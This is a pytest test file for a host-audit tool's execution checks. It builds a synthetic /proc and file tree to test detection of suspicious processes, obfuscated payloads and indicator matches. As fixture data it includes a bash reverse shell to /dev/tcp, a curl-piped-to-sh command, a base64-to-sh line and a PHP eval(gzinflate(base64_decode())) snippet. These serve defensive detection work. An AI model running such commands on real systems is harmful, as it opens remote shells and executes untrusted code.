"""The execution checks, against a synthetic /proc and a synthetic host tree.

A /proc built in a temporary directory is enough for everything here except
the one check that reads a symlink, because Windows will not make one without
privileges. That check carries a POSIX-only mark; in CI, on Linux, it runs.
"""

from __future__ import annotations

import hashlib
import os
import time

from support import context, posix_only, write

from holdfast.audit.checks import execution
from holdfast.audit.model import FAIL, PASS, UNKNOWN, WARN

# The planted file's content, and its checksum computed rather than written
# out. A 32-character hex literal is indistinguishable from a token, and the
# privacy guard is right to refuse one; computing it also means the fixture
# cannot drift from the file it is supposed to match.
PLANTED_BODY = "hello"
PLANTED_MD5 = hashlib.md5(PLANTED_BODY.encode()).hexdigest()

INDICATORS = f"""
addresses = ["203.0.113.10"]
filenames = ["planted.php"]

[md5]
"{PLANTED_MD5}" = "seen in the web root"
"""


def make_process(root, pid: int, cmdline: str, *, utime=0, stime=0, start=0) -> None:
    """One entry under /proc, with the fields the checks actually read."""
    base = root / "proc" / str(pid)
    base.mkdir(parents=True)
    (base / "cmdline").write_bytes(cmdline.encode() + b"\0")
    # /proc/<pid>/stat: the fields after the comm are what matter. utime and
    # stime are 14 and 15 counting from one, starttime is 22; after splitting
    # on ") " they land at indices 11, 12 and 19.
    fields = ["S", "1", "1", "0", "-1", "0", "0", "0", "0", "0", "0"]
    fields += [str(utime), str(stime)]
    fields += ["0"] * 6
    fields += [str(start)]
    (base / "stat").write_text(f"{pid} (proc) " + " ".join(fields), encoding="utf-8")


def with_indicators(tmp_path, **extra):
    path = tmp_path / "iocs.toml"
    path.write_text(INDICATORS, encoding="utf-8")
    return context(tmp_path, **{"audit.indicators": str(path), **extra})


# -- process_from_temp ------------------------------------------------------


def test_no_proc_is_unknown(tmp_path):
    assert execution._process_from_temp(context(tmp_path))[0] == UNKNOWN


def test_processes_not_from_temp_pass(tmp_path):
    make_process(tmp_path, 1, "/usr/sbin/nginx")
    status, detail, _ = execution._process_from_temp(context(tmp_path))
    assert status == PASS
    assert "1 processes" in detail


@posix_only
def test_a_process_running_from_temp_fails(tmp_path):
    make_process(tmp_path, 7, "/tmp/.x")
    (tmp_path / "proc" / "7" / "exe").symlink_to("/tmp/.x")
    status, detail, _ = execution._process_from_temp(context(tmp_path))
    assert status == FAIL
    assert "pid=7" in detail


# -- suspicious_process -----------------------------------------------------


def test_an_ordinary_command_line_passes(tmp_path):
    make_process(tmp_path, 1, "/usr/sbin/nginx -g daemon off;")
    assert execution._suspicious_process(context(tmp_path))[0] == PASS


def test_a_reverse_shell_command_line_fails(tmp_path):
    make_process(tmp_path, 9, "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1")
    status, detail, _ = execution._suspicious_process(context(tmp_path))
    assert status == FAIL
    assert "pid=9" in detail


def test_a_curl_to_shell_pipeline_fails(tmp_path):
    make_process(tmp_path, 11, "sh -c curl http://example.com/i.sh | sh")
    assert execution._suspicious_process(context(tmp_path))[0] == FAIL


# -- executables_in_temp ----------------------------------------------------


def test_an_empty_temp_passes(tmp_path):
    (tmp_path / "tmp").mkdir()
    assert execution._executables_in_temp(context(tmp_path))[0] == PASS


def test_a_new_script_in_temp_warns(tmp_path):
    write(tmp_path, "/tmp/payload.php", "<?php\n")
    status, detail, _ = execution._executables_in_temp(context(tmp_path))
    assert status == WARN
    assert "/tmp/payload.php" in detail


def test_an_ignored_name_is_not_reported(tmp_path):
    write(tmp_path, "/tmp/sess_abc123.php", "<?php\n")
    assert execution._executables_in_temp(context(tmp_path))[0] == PASS


def test_a_zero_window_reports_nothing_as_new(tmp_path):
    path = write(tmp_path, "/tmp/payload.php", "<?php\n")
    # A minute back, so the comparison is not deciding a tie with `now`.
    when = time.time() - 60
    os.utime(path, (when, when))
    ctx = context(tmp_path, **{"audit.temp.window_minutes": 0})
    status, detail, _ = execution._executables_in_temp(ctx)
    assert status == PASS
    assert "1 older one(s) not listed" in detail


# -- obfuscated_payload -----------------------------------------------------


def test_plain_code_passes(tmp_path):
    write(tmp_path, "/opt/app/run.sh", "#!/bin/sh\necho hello\n")
    assert execution._obfuscated_payload(context(tmp_path))[0] == PASS


def test_a_base64_decode_pipeline_warns(tmp_path):
    write(tmp_path, "/tmp/stage.sh", "echo aGk= | base64 -d | sh\n")
    status, detail, _ = execution._obfuscated_payload(context(tmp_path))
    assert status == WARN
    assert "/tmp/stage.sh" in detail


def test_other_encodings_are_recognised_too(tmp_path):
    """The point of generalising: one spelling was never the class."""
    write(tmp_path, "/var/www/app/x.php", "<?php eval(gzinflate(base64_decode($a)));")
    assert execution._obfuscated_payload(context(tmp_path))[0] == WARN


# -- known_indicators -------------------------------------------------------


def test_no_indicator_list_is_unknown_not_pass(tmp_path):
    status, detail, _ = execution._known_indicators(context(tmp_path))
    assert status == UNKNOWN
    assert "nothing to match against" in detail


def test_a_file_matching_by_name_fails(tmp_path):
    write(tmp_path, "/tmp/planted.php", "<?php\n")
    status, detail, _ = execution._known_indicators(with_indicators(tmp_path))
    assert status == FAIL
    assert "by name" in detail
    assert "evidence" in detail


def test_a_file_matching_by_checksum_fails(tmp_path):
    write(tmp_path, "/tmp/innocent.txt", PLANTED_BODY)
    status, detail, _ = execution._known_indicators(with_indicators(tmp_path))
    assert status == FAIL
    assert "by checksum" in detail


def test_a_file_containing_an_indicator_address_fails(tmp_path):
    write(tmp_path, "/opt/app/notes.txt", "callback to 203.0.113.10\n")
    status, detail, _ = execution._known_indicators(with_indicators(tmp_path))
    assert status == FAIL
    assert "by address" in detail


def test_a_clean_sweep_says_what_it_looked_for(tmp_path):
    """ "Nothing found" without the list of what was sought is worth nothing."""
    write(tmp_path, "/opt/app/index.php", "<?php\n")
    status, detail, _ = execution._known_indicators(with_indicators(tmp_path))
    assert status == PASS
    assert "Checked:" in detail
    assert "iocs.toml" in detail


# -- cpu_anomaly ------------------------------------------------------------


def test_no_uptime_is_unknown(tmp_path):
    assert execution._cpu_anomaly(context(tmp_path))[0] == UNKNOWN


def test_a_short_lived_busy_process_passes(tmp_path):
    write(tmp_path, "/proc/uptime", "10000.0 9000.0\n")
    # Started 60s before now, so below the minimum age however busy it is.
    make_process(tmp_path, 3, "tar czf backup.tgz /opt", utime=6000, start=994000)
    assert execution._cpu_anomaly(context(tmp_path))[0] == PASS


def test_a_long_lived_busy_process_warns(tmp_path):
    write(tmp_path, "/proc/uptime", "100000.0 9000.0\n")
    # Started at boot and has used 99 000 CPU seconds of 100 000 elapsed.
    make_process(tmp_path, 5, "/tmp/.kworker", utime=9_900_000, start=0)
    status, detail, _ = execution._cpu_anomaly(context(tmp_path))
    assert status == WARN
    assert "pid=5" in detail


def test_an_ignored_command_line_is_not_reported(tmp_path):
    write(tmp_path, "/proc/uptime", "100000.0 9000.0\n")
    make_process(tmp_path, 6, "mysqldump --all-databases", utime=9_900_000, start=0)
    assert execution._cpu_anomaly(context(tmp_path))[0] == PASS
